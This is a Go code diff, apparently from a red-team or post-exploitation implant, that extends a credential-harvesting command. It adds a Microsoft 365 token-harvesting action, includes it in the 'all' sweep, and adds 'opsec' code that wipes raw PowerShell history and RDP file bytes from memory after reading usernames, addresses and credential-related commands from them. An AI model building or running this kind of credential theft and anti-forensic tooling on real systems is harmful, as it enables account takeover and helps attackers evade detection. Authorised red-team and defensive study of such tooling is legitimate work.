@@ -19,10 +19,12 @@ func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
 		return credConfigs(args)
 	case "windows":
 		return credWindows(args)
+	case "m365-tokens":
+		return credM365Tokens(args)
 	case "all":
 		return credAllWindows(args)
 	default:
-		return errorf("Unknown action: %s\nAvailable: cloud, configs, windows, all", args.Action)
+		return errorf("Unknown action: %s\nAvailable: cloud, configs, windows, m365-tokens, all", args.Action)
 	}
 }
 
@@ -47,7 +49,9 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", psHistoryPath, info.Size()))
 
 		if data, err := os.ReadFile(psHistoryPath); err == nil {
-			lines := strings.Split(strings.TrimRight(string(data), "\r\n"), "\n")
+			content := string(data)
+			structs.ZeroBytes(data) // opsec: clear raw history bytes from memory
+			lines := strings.Split(strings.TrimRight(content, "\r\n"), "\n")
 			// Show last 50 lines, highlight credential-related commands
 			start := 0
 			if len(lines) > 50 {
@@ -83,7 +87,9 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 			rdpFound = true
 			sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", rdpPath, info.Size()))
 			if data, err := os.ReadFile(rdpPath); err == nil {
-				for _, line := range strings.Split(string(data), "\n") {
+				rdpContent := string(data)
+				structs.ZeroBytes(data) // opsec: clear raw RDP data
+				for _, line := range strings.Split(rdpContent, "\n") {
 					line = strings.TrimRight(line, "\r")
 					if strings.HasPrefix(line, "full address") || strings.HasPrefix(line, "username") {
 						sb.WriteString(fmt.Sprintf("    %s\n", line))
@@ -199,8 +205,15 @@ func credAllWindows(args credHarvestArgs) structs.CommandResult {
 
 	configs := credConfigs(args)
 	sb.WriteString(configs.Output)
+	sb.WriteString("\n")
 	if configs.Credentials != nil {
 		allCreds = append(allCreds, *configs.Credentials...)
+	}
+
+	m365 := credM365Tokens(args)
+	sb.WriteString(m365.Output)
+	if m365.Credentials != nil {
+		allCreds = append(allCreds, *m365.Credentials...)
 	}
 
 	result := structs.CommandResult{
